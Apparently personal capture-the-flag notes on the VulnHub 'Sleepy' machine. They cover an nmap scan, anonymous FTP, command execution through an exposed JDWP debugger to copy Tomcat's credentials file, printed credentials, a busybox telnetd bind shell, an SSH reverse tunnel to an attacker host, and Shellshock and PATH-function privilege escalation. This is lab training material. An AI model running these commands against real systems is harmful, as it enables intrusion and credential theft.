https://g0blin.co.uk/devrandom-sleepy-vulnhub-writeup/
http://devloop.users.sourceforge.net/index.php?article138/solution-du-ctf-dev-random-sleepy-de-vulnhub

https://highon.coffee/blog/sleepy-ctf-walkthrough/

https://www.serma-safety-security.com/vulnerabilite-critique-sur-bash-cve-2014-6271-shellshock/

https://www.minttm.com/takeover-shellshocker-net


Machines :  shellshock, symfonos 2, sleepy
Keys : Java Debug Wire Protocol (JDWP) version 1.6 1.7.0_71, 



	└─$ sudo nmap -sT -A -p- -Pn -sV 192.168.56.6
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-18 16:04 CET
	Stats: 0:02:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
	Nmap scan report for 192.168.56.6
	Host is up (0.00022s latency).
	Not shown: 65532 filtered tcp ports (no-response)
	PORT     STATE SERVICE VERSION
	21/tcp   open  ftp     vsftpd 2.0.8 or later
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to 192.168.56.1
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 1
	|      vsFTPd 3.0.2 - secure, fast, stable
	|_End of status
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_Can't get directory listing: TIMEOUT
	8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
	|_ajp-methods: Failed to get a valid response for the OPTION request
	9001/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.6 1.7.0_71
	|_jdwp-info: ERROR: Script execution failed (use -d to debug)
	MAC Address: 08:00:27:00:AC:78 (Oracle VirtualBox virtual NIC)
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose
	Running: Linux 2.6.X|3.X
	OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
	OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13, Linux 3.4 - 3.10
	Network Distance: 1 hop

	TRACEROUTE
	HOP RTT     ADDRESS
	1   0.22 ms 192.168.56.6

	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 148.19 seconds


# FTP connexion

	$ ftp 192.168.56.6
	Connected to 192.168.56.6.
	220 ZzZZzZzz FTP
	Name (192.168.56.6:kali): ftp
	331 Please specify the password.
	Password:
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> ls
	200 PORT command successful. Consider using PASV.
	150 Here comes the directory listing.
	drwxrwxrwx    2 0        1002           23 Jun 19  2015 pub
	226 Directory send OK.
	ftp> cd pub
	250 Directory successfully changed.
	ftp> ls
	200 PORT command successful. Consider using PASV.
	150 Here comes the directory listing.
	-rw-r--r--    1 1002     1002       120456 Jun 18  2015 sleepy.png
	226 Directory send OK.
	ftp> get sleepy.png 
	local: sleepy.png remote: sleepy.png
	200 PORT command successful. Consider using PASV.
	150 Opening BINARY mode data connection for sleepy.png (120456 bytes).
	226 Transfer complete.
	120456 bytes received in 0.01 secs (16.4508 MB/s)
	ftp> put sleepy.png  s.png
	local: sleepy.png remote: s.png
	200 PORT command successful. Consider using PASV.
	550 Permission denied.


# JDWP exploit 

Install jdb

	sudo apt install -y default-jdk


└─$ jdb -attach 192.168.56.6:9001
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> threads
Group system:
  (java.lang.ref.Reference$ReferenceHandler)0x19e Reference Handler cond. waiting
  (java.lang.ref.Finalizer$FinalizerThread)0x19f  Finalizer         cond. waiting
  (java.lang.Thread)0x1a0                         Signal Dispatcher running
Group main:
  (java.lang.Thread)0x1                           main              sleeping
> interrupt 0x1
> 
Exception occurred: java.lang.InterruptedException (uncaught)"thread=main", java.lang.Thread.sleep(), line=-1 bci=-1

main[1] print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/").getInputStream())).readLine())
java.lang.NullPointerException
        at jdk.jdi/com.sun.tools.example.debug.expr.LValue.argumentsMatch(LValue.java:268)
        at jdk.jdi/com.sun.tools.example.debug.expr.LValue.resolveOverload(LValue.java:399)
        at jdk.jdi/com.sun.tools.example.debug.expr.LValue.makeNewObject(LValue.java:846)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.AllocationExpression(ExpressionParser.java:1063)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.PrimaryPrefix(ExpressionParser.java:909)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.PrimaryExpression(ExpressionParser.java:860)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.PostfixExpression(ExpressionParser.java:787)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.UnaryExpressionNotPlusMinus(ExpressionParser.java:712)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.UnaryExpression(ExpressionParser.java:653)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.MultiplicativeExpression(ExpressionParser.java:579)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.AdditiveExpression(ExpressionParser.java:547)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.ShiftExpression(ExpressionParser.java:512)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.RelationalExpression(ExpressionParser.java:473)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.InstanceOfExpression(ExpressionParser.java:458)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.EqualityExpression(ExpressionParser.java:427)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.AndExpression(ExpressionParser.java:408)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.ExclusiveOrExpression(ExpressionParser.java:390)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.InclusiveOrExpression(ExpressionParser.java:372)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.ConditionalAndExpression(ExpressionParser.java:354)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.ConditionalOrExpression(ExpressionParser.java:336)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.ConditionalExpression(ExpressionParser.java:313)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.Expression(ExpressionParser.java:250)
        at jdk.jdi/com.sun.tools.example.debug.expr.ExpressionParser.evaluate(ExpressionParser.java:75)
        at jdk.jdi/com.sun.tools.example.debug.tty.Commands.evaluate(Commands.java:114)
        at jdk.jdi/com.sun.tools.example.debug.tty.Commands.doPrint(Commands.java:1653)
        at jdk.jdi/com.sun.tools.example.debug.tty.Commands$3.action(Commands.java:1679)
        at jdk.jdi/com.sun.tools.example.debug.tty.Commands$AsyncExecution$1.run(Commands.java:66)
 new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/").getInputStream())).readLine()) = null
main[1] exit



user username="sl33py" password="Gu3SSmYStR0NgPa$sw0rD!" roles="tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status"/>

./busybox telnetd -l /bin/bash -p 4444

ssh kali@10.0.1.1 -R 4444:127.0.0.1:4444 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no


SHELLSHOCK
bash-4.2$ env x='() { :;}; echo vulnerable' bash -c "echo test"

bash-4.2$ function /usr/bin/sl () { /bin/bash; }
bash-4.2$ export -f /usr/bin/sl



